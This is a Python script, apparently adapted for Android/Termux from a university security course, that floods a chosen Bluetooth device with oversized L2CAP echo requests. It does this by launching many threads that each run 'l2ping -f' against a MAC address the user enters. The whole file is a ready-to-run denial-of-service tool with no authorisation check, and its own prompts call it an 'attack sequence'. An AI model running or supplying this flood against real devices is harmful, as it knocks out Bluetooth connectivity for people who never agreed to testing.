import os
import threading
import time
import sys

def DOS(target_addr, packages_size):
    """
    Executes the l2ping command to stress test the target device.
    Requires root privileges on Android/Termux to access the hci0 interface.
    """
    command = f"l2ping -i hci0 -s {packages_size} -f {target_addr} > /dev/null 2>&1"
    os.system(command)

def printLogo():
    print("\033[94m" + "="*50)
    print("  TERMUX BLUETOOTH STRESS TESTER (L2CAP)")
    print("  Original: GMU CYSE 425 | Adapted for Termux")
    print("="*50 + "\033[0m")

def main():
    os.system('clear')
    printLogo()
    
    choice = input("\nREADY TO PROCEED? (y/n) > ").lower()
    if choice != 'y':
        print("\033[93m[*] Aborted by user.\033[0m")
        sys.exit(0)

    target_addr = input('\nTarget MAC Address (e.g., AA:BB:CC:DD:EE:FF) > ').strip()
    if not target_addr:
        print('\033[91m[!] ERROR: Target address is missing.\033[0m')
        sys.exit(1)

    try:
        packages_size = int(input('Packet Size (Bytes, Max 600) > '))
        threads_count = int(input('Number of Threads > '))
    except ValueError:
        print('\033[91m[!] ERROR: Packet size and thread count must be integers.\033[0m')
        sys.exit(1)

    os.system('clear')
    print("\033[31m[*] Initializing attack sequence in 3 seconds...\033[0m")
    for i in range(3, 0, -1):
        print(f"[*] {i}...")
        time.sleep(1)

    print('\n[*] Building and spawning threads...')
    for i in range(threads_count):
        # Create a daemon thread so it automatically dies when the main program exits
        t = threading.Thread(target=DOS, args=(target_addr, packages_size))
        t.daemon = True 
        t.start()
        
        # Print progress every 10 threads to avoid flooding the terminal
        if (i + 1) % 10 == 0 or (i + 1) == threads_count:
            print(f"[*] Successfully built thread № {i + 1}")

    print('\n\033[92m[+] All threads active. Stress test is running.\033[0m')
    print('\033[93m[*] Press Ctrl+C to stop the attack.\033[0m')
    
    # Keep the main thread alive to allow daemon threads to run
    while True:
        time.sleep(1)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n\033[93m[*] Keyboard Interrupt detected. Shutting down threads...\033[0m')
        sys.exit(0)
    except Exception as e:
        print(f'\n\033[91m[!] UNEXPECTED ERROR: {str(e)}\033[0m')
        sys.exit(1)
